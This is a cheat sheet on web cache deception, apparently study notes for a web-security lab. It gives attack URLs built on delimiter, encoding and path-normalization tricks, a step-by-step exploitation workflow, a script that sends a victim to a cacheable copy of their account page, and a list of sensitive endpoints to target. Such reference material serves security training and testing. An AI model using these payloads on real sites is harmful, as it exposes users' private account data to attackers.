# Web Cache Deception — Cheat Sheet

## Attack Types Quick Reference

| Discrepancy | Attack URL | Server Sees | Cache Sees |
|---|---|---|---|
| Path Mapping | `/account/abc.js` | `/account` | `.js` extension |
| Delimiter | `/account;abc.js` | `/account` (stops at `;`) | `.js` extension |
| Encoded Delimiter | `/account%3babc.js` | `/account` (decodes `;`) | `.js` extension |
| Static Dir (server normalizes) | `/static/..%2faccount` | `/account` | `/static` prefix |
| Static Dir (cache normalizes) | `/account;%2f%2e%2e%2fstatic` | `/account` (stops at `;`) | `/static` prefix |

---

## X-Cache Headers

| Result | Meaning |
|---|---|
| No cache header | Cache didn't store — no discrepancy |
| `X-Cache: miss` | Cache stored it for first time |
| `X-Cache: hit` | Cache served stored response |
| `miss → hit` | **Discrepancy confirmed — attack works** |

---

## URL Encoding Reference

| Encoded | Decoded | Used As |
|---|---|---|
| `%2f` | `/` | Slash |
| `%2e` | `.` | Dot |
| `%3b` | `;` | Delimiter |
| `%3f` | `?` | Delimiter |
| `%23` | `#` | Delimiter |
| `%00` | null | Path truncator |
| `%0a` | newline | Path truncator |
| `%09` | tab | Path truncator |
| `%2f%2e%2e%2f` | `/../` | Full path traversal |

---

## Testing Workflow

```
1. FIND sensitive endpoint
         ↓
2. TEST path mapping
   /my-account/abc → same response?
   YES → /my-account/abc.js → cached? → ATTACK ✅
         ↓ NO
3. TEST delimiters (Intruder)
   /my-account§§abc → which char returns baseline?
   FOUND → /my-account;abc.js → cached? → ATTACK ✅
         ↓ NO
4. TEST encoded delimiters
   /my-account%3babc.js → cached? → ATTACK ✅
   /my-account%00abc.js → cached? → ATTACK ✅
         ↓ NO
5. TEST static directory
   Server normalizes /aaa/..%2fmy-account?
   YES + Cache doesn't normalize? → /static/..%2fmy-account → ATTACK ✅
         ↓ NO
6. Cache normalizes but server doesn't?
   /my-account;%2f%2e%2e%2fstatic → ATTACK ✅
```

---

## Normalization Quick Test

### Does the server normalize?
```
Send:  /aaa/..%2fmy-account
Same response as /my-account? → YES ✅
404?                           → NO ❌
```

### Does the cache normalize?
```
Send:  /aaa/..%2fresources/file.js
No longer cached? → Doesn't normalize ✅
Still cached?     → Normalizes ❌
```

### Confirm cache rule is prefix based:
```
Send:  /resources/aaa
miss → hit? → Prefix rule confirmed ✅
```

---

## Exploit Delivery

```html
<!-- Basic -->
<script>document.location="https://TARGET/ATTACK-URL"</script>

<!-- With cache buster -->
<script>document.location="https://TARGET/resources/..%2fmy-account?wcd"</script>
```

---

## Burp Setup Checklist

```
✅ Param Miner installed
✅ Dynamic cachebuster enabled
✅ Intruder URL encoding turned OFF
✅ Session cookie included in all requests
✅ Using Repeater not browser to fetch cached responses
```

---

## Golden Rules

```
✅ Always use cache buster while testing
✅ Always confirm miss → hit before exploiting
✅ Always change arbitrary segment before delivering to victim
✅ Use POST requests when testing server normalization
✅ Test multiple extensions: .js .css .ico .exe
✅ Fetch cached victim response via Burp not browser
✅ Change the path segment each time you deliver an exploit
```

---

## Common Sensitive Endpoints to Target

```
/my-account
/profile
/dashboard
/api/user/info
/api/orders/
/settings
```
